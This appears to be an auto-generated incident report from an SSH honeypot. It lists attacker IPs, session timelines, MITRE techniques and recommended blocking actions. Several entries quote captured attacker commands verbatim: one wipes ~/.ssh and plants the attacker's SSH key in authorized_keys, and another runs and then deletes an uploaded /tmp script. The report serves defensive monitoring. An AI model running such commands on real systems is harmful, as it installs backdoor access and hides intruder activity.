| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:24:17` | `cowrie.session.connect` |
| `2026-07-02 08:24:17` | `cowrie.client.version` |
| `2026-07-02 08:24:18` | `cowrie.client.kex` |
| `2026-07-02 08:24:19` | `cowrie.login.success` |
| `2026-07-02 08:24:20` | `cowrie.session.params` |
| `2026-07-02 08:24:20` | `cowrie.command.input` |
| `2026-07-02 08:24:20` | `cowrie.command.failed` |
| `2026-07-02 08:24:20` | `cowrie.log.closed` |
| `2026-07-02 08:24:21` | `cowrie.session.params` |
| `2026-07-02 08:24:21` | `cowrie.command.input` |
| `2026-07-02 08:24:21` | `cowrie.session.file_download` |
| `2026-07-02 08:24:21` | `cowrie.log.closed` |
| `2026-07-02 08:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91855479c309

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-02 08:24 |
| **Last Seen** | 2026-07-02 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:24:22` | `cowrie.session.connect` |
| `2026-07-02 08:24:22` | `cowrie.client.version` |
| `2026-07-02 08:24:22` | `cowrie.client.kex` |
| `2026-07-02 08:24:23` | `cowrie.login.success` |
| `2026-07-02 08:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162fa801a5a6

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-02 08:24 |
| **Last Seen** | 2026-07-02 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:24:23` | `cowrie.session.connect` |
| `2026-07-02 08:24:23` | `cowrie.client.version` |
| `2026-07-02 08:24:23` | `cowrie.client.kex` |
| `2026-07-02 08:24:24` | `cowrie.login.success` |
| `2026-07-02 08:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5c684279100

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:25 |
| **Last Seen** | 2026-07-02 08:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:25:06` | `cowrie.session.connect` |
| `2026-07-02 08:25:07` | `cowrie.client.version` |
| `2026-07-02 08:25:07` | `cowrie.client.kex` |
| `2026-07-02 08:25:13` | `cowrie.login.success` |
| `2026-07-02 08:25:17` | `cowrie.session.params` |
| `2026-07-02 08:25:17` | `cowrie.command.input` |
| `2026-07-02 08:25:18` | `cowrie.log.closed` |
| `2026-07-02 08:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa79063a499

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 08:27 |
| **Last Seen** | 2026-07-02 08:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:27:21` | `cowrie.session.connect` |
| `2026-07-02 08:27:22` | `cowrie.client.version` |
| `2026-07-02 08:27:22` | `cowrie.client.kex` |
| `2026-07-02 08:27:23` | `cowrie.login.success` |
| `2026-07-02 08:27:24` | `cowrie.session.params` |
| `2026-07-02 08:27:24` | `cowrie.command.input` |
| `2026-07-02 08:27:24` | `cowrie.log.closed` |
| `2026-07-02 08:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c625ad636f93

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-02 08:29 |
| **Last Seen** | 2026-07-02 08:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:29:35` | `cowrie.session.connect` |
| `2026-07-02 08:29:35` | `cowrie.client.version` |
| `2026-07-02 08:29:35` | `cowrie.client.kex` |
| `2026-07-02 08:29:35` | `cowrie.login.success` |
| `2026-07-02 08:29:36` | `cowrie.session.params` |
| `2026-07-02 08:29:36` | `cowrie.command.input` |
| `2026-07-02 08:29:36` | `cowrie.command.failed` |
| `2026-07-02 08:29:36` | `cowrie.log.closed` |
| `2026-07-02 08:29:37` | `cowrie.session.params` |
| `2026-07-02 08:29:37` | `cowrie.command.input` |
| `2026-07-02 08:29:37` | `cowrie.session.file_download` |
| `2026-07-02 08:29:37` | `cowrie.log.closed` |
| `2026-07-02 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b95f3dcc302

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-02 08:29 |
| **Last Seen** | 2026-07-02 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:29:37` | `cowrie.session.connect` |
| `2026-07-02 08:29:37` | `cowrie.client.version` |
| `2026-07-02 08:29:37` | `cowrie.client.kex` |
| `2026-07-02 08:29:38` | `cowrie.login.success` |
| `2026-07-02 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3a978f232d

| Field | Detail |
|---|---|
| **Source IP** | `161.132.54[.]218` |
| **First Seen** | 2026-07-02 08:29 |
| **Last Seen** | 2026-07-02 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:29:38` | `cowrie.session.connect` |
| `2026-07-02 08:29:38` | `cowrie.client.version` |
| `2026-07-02 08:29:38` | `cowrie.client.kex` |
| `2026-07-02 08:29:38` | `cowrie.login.success` |
| `2026-07-02 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.132.54[.]218` to AbuseIPDB if not already reported
- [ ] Block `161.132.54[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6207274cf296

| Field | Detail |
|---|---|
| **Source IP** | `217.216.111[.]63` |
| **First Seen** | 2026-07-02 08:31 |
| **Last Seen** | 2026-07-02 08:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:31:45` | `cowrie.session.connect` |
| `2026-07-02 08:31:45` | `cowrie.client.version` |
| `2026-07-02 08:31:46` | `cowrie.client.kex` |
| `2026-07-02 08:31:47` | `cowrie.login.success` |
| `2026-07-02 08:31:48` | `cowrie.session.params` |
| `2026-07-02 08:31:48` | `cowrie.command.input` |
| `2026-07-02 08:31:48` | `cowrie.command.failed` |
| `2026-07-02 08:31:48` | `cowrie.log.closed` |
| `2026-07-02 08:31:49` | `cowrie.session.params` |
| `2026-07-02 08:31:49` | `cowrie.command.input` |
| `2026-07-02 08:31:49` | `cowrie.session.file_download` |
| `2026-07-02 08:31:49` | `cowrie.log.closed` |
| `2026-07-02 08:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.216.111[.]63` to AbuseIPDB if not already reported
- [ ] Block `217.216.111[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d3e37c62ab

| Field | Detail |
|---|---|
| **Source IP** | `217.216.111[.]63` |
| **First Seen** | 2026-07-02 08:31 |
| **Last Seen** | 2026-07-02 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:31:50` | `cowrie.session.connect` |
| `2026-07-02 08:31:50` | `cowrie.client.version` |
| `2026-07-02 08:31:50` | `cowrie.client.kex` |
| `2026-07-02 08:31:51` | `cowrie.login.success` |
| `2026-07-02 08:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.216.111[.]63` to AbuseIPDB if not already reported
- [ ] Block `217.216.111[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b52686bc202

| Field | Detail |
|---|---|
| **Source IP** | `217.216.111[.]63` |
| **First Seen** | 2026-07-02 08:31 |
| **Last Seen** | 2026-07-02 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:31:51` | `cowrie.session.connect` |
| `2026-07-02 08:31:51` | `cowrie.client.version` |
| `2026-07-02 08:31:52` | `cowrie.client.kex` |
| `2026-07-02 08:31:53` | `cowrie.login.success` |
| `2026-07-02 08:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.216.111[.]63` to AbuseIPDB if not already reported
- [ ] Block `217.216.111[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cead55735344

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:36 |
| **Last Seen** | 2026-07-02 08:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:36:07` | `cowrie.session.connect` |
| `2026-07-02 08:36:08` | `cowrie.client.version` |
| `2026-07-02 08:36:08` | `cowrie.client.kex` |
| `2026-07-02 08:36:14` | `cowrie.login.success` |
| `2026-07-02 08:36:17` | `cowrie.session.params` |
| `2026-07-02 08:36:17` | `cowrie.command.input` |
| `2026-07-02 08:36:18` | `cowrie.log.closed` |
| `2026-07-02 08:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45913eed16af

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 08:41 |
| **Last Seen** | 2026-07-02 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:41:27` | `cowrie.session.connect` |
| `2026-07-02 08:41:28` | `cowrie.client.version` |
| `2026-07-02 08:41:28` | `cowrie.client.kex` |
| `2026-07-02 08:41:30` | `cowrie.login.success` |
| `2026-07-02 08:41:31` | `cowrie.session.params` |
| `2026-07-02 08:41:31` | `cowrie.command.input` |
| `2026-07-02 08:41:32` | `cowrie.log.closed` |
| `2026-07-02 08:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674647d52424

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:15` | `cowrie.session.connect` |
| `2026-07-02 08:42:15` | `cowrie.client.version` |
| `2026-07-02 08:42:15` | `cowrie.client.kex` |
| `2026-07-02 08:42:15` | `cowrie.login.success` |
| `2026-07-02 08:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d35352bd09

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:17` | `cowrie.session.connect` |
| `2026-07-02 08:42:17` | `cowrie.client.version` |
| `2026-07-02 08:42:17` | `cowrie.client.kex` |
| `2026-07-02 08:42:17` | `cowrie.login.success` |
| `2026-07-02 08:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1e2c0641d1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:19` | `cowrie.session.connect` |
| `2026-07-02 08:42:19` | `cowrie.client.version` |
| `2026-07-02 08:42:19` | `cowrie.client.kex` |
| `2026-07-02 08:42:19` | `cowrie.login.success` |
| `2026-07-02 08:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e923fe98b685

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:19` | `cowrie.session.connect` |
| `2026-07-02 08:42:19` | `cowrie.client.version` |
| `2026-07-02 08:42:19` | `cowrie.client.kex` |
| `2026-07-02 08:42:19` | `cowrie.login.success` |
| `2026-07-02 08:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfca417a7f4f

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:33` | `cowrie.session.connect` |
| `2026-07-02 08:42:33` | `cowrie.client.version` |
| `2026-07-02 08:42:33` | `cowrie.client.kex` |
| `2026-07-02 08:42:34` | `cowrie.login.success` |
| `2026-07-02 08:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6639dfa4e6d

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:33` | `cowrie.session.connect` |
| `2026-07-02 08:42:33` | `cowrie.client.version` |
| `2026-07-02 08:42:33` | `cowrie.client.kex` |
| `2026-07-02 08:42:34` | `cowrie.login.success` |
| `2026-07-02 08:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b26c90e1fe

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-02 08:42 |
| **Last Seen** | 2026-07-02 08:45 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:42:53` | `cowrie.session.connect` |
| `2026-07-02 08:42:53` | `cowrie.client.version` |
| `2026-07-02 08:42:53` | `cowrie.client.kex` |
| `2026-07-02 08:42:54` | `cowrie.login.success` |
| `2026-07-02 08:42:56` | `cowrie.session.file_upload` |
| `2026-07-02 08:42:56` | `cowrie.session.params` |
| `2026-07-02 08:42:56` | `cowrie.command.input` |
| `2026-07-02 08:42:56` | `cowrie.command.input` |
| `2026-07-02 08:42:56` | `cowrie.command.input` |
| `2026-07-02 08:42:56` | `cowrie.command.failed` |
| `2026-07-02 08:42:57` | `cowrie.log.closed` |
| `2026-07-02 08:42:58` | `cowrie.session.params` |
| `2026-07-02 08:42:58` | `cowrie.command.input` |
| `2026-07-02 08:42:58` | `cowrie.log.closed` |
| `2026-07-02 08:42:59` | `cowrie.session.params` |
| `2026-07-02 08:42:59` | `cowrie.command.input` |
| `2026-07-02 08:42:59` | `cowrie.log.closed` |
| `2026-07-02 08:43:00` | `cowrie.session.params` |
| `2026-07-02 08:43:00` | `cowrie.command.input` |
| `2026-07-02 08:43:00` | `cowrie.command.failed` |
| `2026-07-02 08:43:00` | `cowrie.command.failed` |
| `2026-07-02 08:44:01` | `cowrie.session.params` |
| `2026-07-02 08:44:01` | `cowrie.command.input` |
| `2026-07-02 08:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9399beb95bf3

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-02 08:45 |
| **Last Seen** | 2026-07-02 08:47 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:45:18` | `cowrie.session.connect` |
| `2026-07-02 08:45:18` | `cowrie.client.version` |
| `2026-07-02 08:45:18` | `cowrie.client.kex` |
| `2026-07-02 08:45:19` | `cowrie.login.success` |
| `2026-07-02 08:45:20` | `cowrie.session.file_upload` |
| `2026-07-02 08:45:21` | `cowrie.session.params` |
| `2026-07-02 08:45:21` | `cowrie.command.input` |
| `2026-07-02 08:45:21` | `cowrie.command.input` |
| `2026-07-02 08:45:21` | `cowrie.command.input` |
| `2026-07-02 08:45:21` | `cowrie.command.failed` |
| `2026-07-02 08:45:22` | `cowrie.log.closed` |
| `2026-07-02 08:45:23` | `cowrie.session.params` |
| `2026-07-02 08:45:23` | `cowrie.command.input` |
| `2026-07-02 08:45:23` | `cowrie.log.closed` |
| `2026-07-02 08:45:24` | `cowrie.session.params` |
| `2026-07-02 08:45:24` | `cowrie.command.input` |
| `2026-07-02 08:45:24` | `cowrie.log.closed` |
| `2026-07-02 08:45:25` | `cowrie.session.params` |
| `2026-07-02 08:45:25` | `cowrie.command.input` |
| `2026-07-02 08:45:25` | `cowrie.command.failed` |
| `2026-07-02 08:45:25` | `cowrie.command.failed` |
| `2026-07-02 08:46:26` | `cowrie.session.params` |
| `2026-07-02 08:46:26` | `cowrie.command.input` |
| `2026-07-02 08:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5492fb28e09

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:47 |
| **Last Seen** | 2026-07-02 08:47 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:47:13` | `cowrie.session.connect` |
| `2026-07-02 08:47:15` | `cowrie.client.version` |
| `2026-07-02 08:47:15` | `cowrie.client.kex` |
| `2026-07-02 08:47:20` | `cowrie.login.success` |
| `2026-07-02 08:47:24` | `cowrie.session.params` |
| `2026-07-02 08:47:24` | `cowrie.command.input` |
| `2026-07-02 08:47:26` | `cowrie.log.closed` |
| `2026-07-02 08:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18f15d73763

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 08:48 |
| **Last Seen** | 2026-07-02 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:48:36` | `cowrie.session.connect` |
| `2026-07-02 08:48:36` | `cowrie.client.version` |
| `2026-07-02 08:48:36` | `cowrie.client.kex` |
| `2026-07-02 08:48:36` | `cowrie.login.success` |
| `2026-07-02 08:48:37` | `cowrie.session.params` |
| `2026-07-02 08:48:37` | `cowrie.command.input` |
| `2026-07-02 08:48:38` | `cowrie.log.closed` |
| `2026-07-02 08:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.156.17[.]76` | **30** | 2026-07-02 08:20 | 2026-07-02 08:20 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **16** | 2026-07-02 06:58 | 2026-07-02 08:46 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `159.65.233[.]253` | **7** | 2026-07-02 07:13 | 2026-07-02 08:02 | 9m | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | **3** | 2026-07-02 08:37 | 2026-07-02 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.221.66[.]246` | **2** | 2026-07-02 08:34 | 2026-07-02 08:34 | 0m | 0 | `T1592` | 🟢 LOW |
